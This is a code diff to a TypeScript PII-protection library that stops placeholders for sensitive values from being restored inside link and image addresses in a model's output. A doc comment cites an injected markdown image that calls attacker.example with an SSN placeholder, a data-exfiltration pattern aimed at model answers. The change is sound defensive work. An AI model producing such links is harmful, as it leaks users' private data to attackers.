@@ -93,9 +93,11 @@ export interface RestoreReport {
   lost: string[];
   /** Placeholders that are not in the map, e.g. an invented <PERSON_3>. */
   unknown: string[];
+  /** Known placeholders inside a link or image address, left as they are (gap G1). */
+  blocked: string[];
 }
 
-type Kind = "exact" | "repaired" | "lost" | "unknown" | "ignore";
+type Kind = "exact" | "repaired" | "lost" | "unknown" | "blocked" | "ignore";
 
 /** 'Aws key', 'AWS\\_KEY', full-width 'ＰＥＲＳＯＮ' -> 'AWS_KEY' / 'PERSON'. */
 function normLabel(raw: string): string {
@@ -109,6 +111,39 @@ function isTitle(raw: string): boolean {
 // Known values shorter than this are not force-redacted by findKnown: a two
 // letter value would match inside too many unrelated words.
 const MIN_KNOWN_LEN = 3;
+
+// Link and image addresses (gap G1 in docs/threat-model.md). A placeholder is
+// inside one when the word it is part of starts a URL, or when it sits in a
+// markdown link target or an HTML URL attribute that is still open on the
+// same line (those may hold spaces). The same rules as the Python SDK.
+const URL_START = /[a-z][a-z0-9+.-]*:\/\/|\bwww\.|(?<![a-z])(?:mailto|data):/i;
+const URL_ATTR = /\b(?:href|src|srcset|action|formaction|poster|background|cite|ping|data)\s*=\s*(["'])/gi;
+
+/** Is position `pos` of `text` inside a link or image address? */
+export function inUrl(text: string, pos: number): boolean {
+  const line = text.slice(text.lastIndexOf("\n", pos - 1) + 1, pos);
+  const word = line.slice(Math.max(line.lastIndexOf(" "), line.lastIndexOf("\t")) + 1);
+  if (URL_START.test(word)) return true;
+  const i = line.lastIndexOf("](");
+  if (i >= 0 && !line.slice(i + 2).includes(")")) return true;
+  let attr: RegExpMatchArray | undefined;
+  for (const m of line.matchAll(URL_ATTR)) attr = m;
+  return attr !== undefined && !line.slice(attr.index! + attr[0].length).includes(attr[1]!);
+}
+
+function restoreInUrlsDefault(): boolean {
+  const env = (globalThis as { process?: { env?: Record<string, string | undefined> } }).process?.env;
+  return ["1", "true", "yes"].includes((env?.TAINTWARD_RESTORE_IN_URLS ?? "").toLowerCase());
+}
+
+export interface PlaceholderMapOptions {
+  /**
+   * Also restore placeholders inside link and image addresses. Default false
+   * (or TAINTWARD_RESTORE_IN_URLS=1): an injected
+   * ![x](https://attacker.example/?d=<SSN_1>) keeps the placeholder (gap G1).
+   */
+  restoreInUrls?: boolean;
+}
 
 /** Placeholder label for a detector entity type, e.g. US_SSN -> SSN. */
 export function labelFor(entityType: string | undefined, sensitivity: Sensitivity): string {
@@ -149,6 +184,11 @@ export class PlaceholderMap {
   private byPlaceholder = new Map<string, Entry>();
   private counts = new Map<string, number>();
   private knownRe: RegExp | null = null;
+  readonly restoreInUrls: boolean;
+
+  constructor(options: PlaceholderMapOptions = {}) {
+    this.restoreInUrls = options.restoreInUrls ?? restoreInUrlsDefault();
+  }
 
   /** The stable placeholder for `value`; a new one if it is unseen. */
   placeholderFor(value: string, entityType?: string, sensitivity: Sensitivity = "pii"): string {
@@ -208,9 +248,12 @@ export class PlaceholderMap {
    * stay as they are. A string that is a JSON object or array (tool call
    * arguments) is restored inside the parsed JSON, so a real value with a
    * quote or backslash stays valid JSON, and a "<" escaped as \\u003c (Ollama)
-   * is still found.
+   * is still found. Placeholders inside a link or image address stay as they
+   * are unless `restoreInUrls` (gap G1). `before` is text that came before
+   * `text` (earlier stream chunks), used only to see whether a placeholder
+   * continues a link address.
    */
-  restoreText(text: string): string {
+  restoreText(text: string, before = ""): string {
     if (typeof text !== "string" || !text) return text;
     const first = text.trimStart()[0];
     if ((first === "{" || first === "[") && (text.includes("\\u003c") || TOLERANT_ANY.test(text))) {
@@ -226,24 +269,40 @@ export class PlaceholderMap {
         return after === before ? text : after;
       }
     }
-    return this.replaceForms(text, (v) => v);
+    return this.replaceForms(text, (v) => v, before);
   }
 
   /**
    * Like restoreText, for text that sits inside a JSON string (a streamed
    * piece of tool call arguments): the real value is JSON-escaped.
    */
-  restoreJsonFragment(text: string): string {
-    return this.replaceForms(text, (v) => JSON.stringify(v).slice(1, -1));
+  restoreJsonFragment(text: string, before = ""): string {
+    return this.replaceForms(text, (v) => JSON.stringify(v).slice(1, -1), before);
   }
 
   /** What restoring `text` (a model answer, before restore) will do. */
   diagnose(text: string): RestoreReport {
-    const out: RestoreReport = { repaired: [], lost: [], unknown: [] };
+    const out: RestoreReport = { repaired: [], lost: [], unknown: [], blocked: [] };
     if (typeof text !== "string" || !text) return out;
+    const first = text.trimStart()[0];
+    if ((first === "{" || first === "[") && TOLERANT_ANY.test(text)) {
+      let parsed: unknown;
+      try {
+        parsed = JSON.parse(text);
+      } catch {
+        parsed = undefined;
+      }
+      if (parsed !== null && typeof parsed === "object") {
+        // tool call arguments: check each string, as restoreText does
+        return mergeReports(stringsIn(parsed, 0).map((s) => this.diagnose(s)));
+      }
+    }
     for (const m of text.matchAll(TOLERANT_G)) {
-      const [, kind] = this.classify(m);
-      if (kind === "repaired" || kind === "lost" || kind === "unknown") out[kind].push(m[0].trim());
+      let [value, kind] = this.classify(m);
+      if (value !== undefined && !this.restoreInUrls && inUrl(text, m.index!)) kind = "blocked";
+      if (kind === "repaired" || kind === "lost" || kind === "unknown" || kind === "blocked") {
+        out[kind].push(m[0].trim());
+      }
     }
     const labels = this.labels();
     for (const m of text.matchAll(NUMBERLESS_G)) {
@@ -252,13 +311,18 @@ export class PlaceholderMap {
     return out;
   }
 
-  private replaceForms(text: string, encode: (v: string) => string): string {
+  private replaceForms(text: string, encode: (v: string) => string, before = ""): string {
     if (typeof text !== "string" || !text || this.byPlaceholder.size === 0 || !TOLERANT_ANY.test(text)) return text;
+    const tail = before.slice(-2000);
     return text.replace(TOLERANT_G, (...args) => {
-      const m = args.slice(0, -2) as unknown as RegExpMatchArray;
-      m.groups = args[args.length - 1] as Record<string, string>;
+      const groups = args[args.length - 1] as Record<string, string>;
+      const offset = args[args.length - 3] as number;
+      const m = args.slice(0, -3) as unknown as RegExpMatchArray;
+      m.groups = groups;
       const [value] = this.classify(m);
-      return value === undefined ? (m[0] as string) : encode(value);
+      if (value === undefined) return m[0] as string;
+      if (!this.restoreInUrls && inUrl(tail + text, tail.length + offset)) return m[0] as string;
+      return encode(value);
     });
   }
 
@@ -362,6 +426,9 @@ export class PlaceholderMap {
  */
 export class StreamRestorer {
   private pending = "";
+  // Text already emitted (raw, last part only): tells whether a placeholder
+  // in the next piece continues a link address (gap G1).
+  private seen = "";
 
   constructor(
     private readonly map: PlaceholderMap,
@@ -385,7 +452,9 @@ export class StreamRestorer {
 
   private apply(s: string): string {
     if (!s) return s;
-    return this.mode === "json" ? this.map.restoreJsonFragment(s) : this.map.restoreText(s);
+    const before = this.seen;
+    this.seen = (this.seen + s).slice(-2000);
+    return this.mode === "json" ? this.map.restoreJsonFragment(s, before) : this.map.restoreText(s, before);
   }
 }
 
@@ -443,8 +512,19 @@ export class PlaceholderRestoreError extends Error {
 
 /** Merge reports, keeping each form once. */
 export function mergeReports(reports: readonly RestoreReport[]): RestoreReport {
-  const out: RestoreReport = { repaired: [], lost: [], unknown: [] };
-  for (const r of reports) for (const k of ["repaired", "lost", "unknown"] as const) out[k].push(...r[k]);
-  for (const k of ["repaired", "lost", "unknown"] as const) out[k] = [...new Set(out[k])];
+  const keys = ["repaired", "lost", "unknown", "blocked"] as const;
+  const out: RestoreReport = { repaired: [], lost: [], unknown: [], blocked: [] };
+  for (const r of reports) for (const k of keys) out[k].push(...(r[k] ?? []));
+  for (const k of keys) out[k] = [...new Set(out[k])];
   return out;
+}
+
+function stringsIn(value: unknown, depth: number): string[] {
+  if (depth > 64) return [];
+  if (typeof value === "string") return [value];
+  if (Array.isArray(value)) return value.flatMap((v) => stringsIn(v, depth + 1));
+  if (value !== null && typeof value === "object") {
+    return Object.values(value).flatMap((v) => stringsIn(v, depth + 1));
+  }
+  return [];
 }
